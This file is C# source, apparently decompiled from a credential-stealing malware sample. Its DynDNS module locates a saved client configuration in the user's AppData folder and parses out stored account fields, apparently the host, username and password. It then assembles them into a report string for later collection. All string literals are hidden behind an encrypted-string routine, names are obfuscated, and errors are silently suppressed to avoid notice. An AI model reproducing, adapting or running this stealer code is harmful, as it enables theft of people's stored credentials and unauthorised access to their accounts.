using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DADynDNS
{
	public class DynDNSdll
	{
		public static void GetDADyn()
		{
			try
			{
				string sFile = Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Interaction.Environ("Username"), RUDUUFDP.CPMXFIPG("bLK9eJ+eq8PLHw==", "False"), 1, -1, (CompareMethod)0) + RUDUUFDP.CPMXFIPG("jZDQzJR/n7OzwJWty8PCja/GzLaas4XCyZ+wxdEZ", "False");
				string sInhalt = RDFLE(sFile);
				string text = CTME(sInhalt, RUDUUFDP.CPMXFIPG("maHT3tGxtgo=", "False"), RUDUUFDP.CPMXFIPG("W6Kzs6tVLw==", "False"));
				string text2 = CTME(sInhalt, RUDUUFDP.CPMXFIPG("bqekuKZ6oaSDMQ==", "False"), Environment.NewLine);
				string text3 = CTME(sInhalt, RUDUUFDP.CPMXFIPG("kLzZ4NavzcqqCg==", "False"), Environment.NewLine);
				string text4 = (JNXOYT.RYKJL = ((Operators.CompareString(text3, "", false) == 0) ? (RUDUUFDP.CPMXFIPG("ZoGMk4VmgYyThWaBk8+2bbLCk4VmgYyThWaBjJOFZoEf", "False") + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("arq6gImUtGyAZXSwbKWqibC+t7hGh7vIs4oh", "False") + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("a4aRmIprhpGYimuGkZiKa4aRmIprhpGYimuGkZiKa4Ya", "False")) : (RUDUUFDP.CPMXFIPG("ZoGMk4VmgYyThWaBk8+2bbLCk4VmgYyThWaBjJOFZoEf", "False") + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("fb/O1sdvcBM=", "False") + text + Environment.NewLine + RUDUUFDP.CPMXFIPG("d7CtwXtCJQ==", "False") + text2 + Environment.NewLine + RUDUUFDP.CPMXFIPG("g8W9mnIT", "False") + text3 + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("a4aRmIprhpGYimuGkZiKa4aRmIprhpGYimuGkZiKa4Ya", "False"))));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				JNXOYT.RYKJL = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string RDFLE(string sFile)
		{
			string result = default(string);
			try
			{
				StreamReader streamReader = new StreamReader(sFile);
				result = streamReader.ReadToEnd().ToString();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string CTME(string sInhalt, string sText, string sText2)
		{
			string result = default(string);
			try
			{
				string[] array = Strings.Split(sInhalt, sText, -1, (CompareMethod)0);
				string[] array2 = Strings.Split(array[1], sText2, -1, (CompareMethod)0);
				result = array2[0];
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
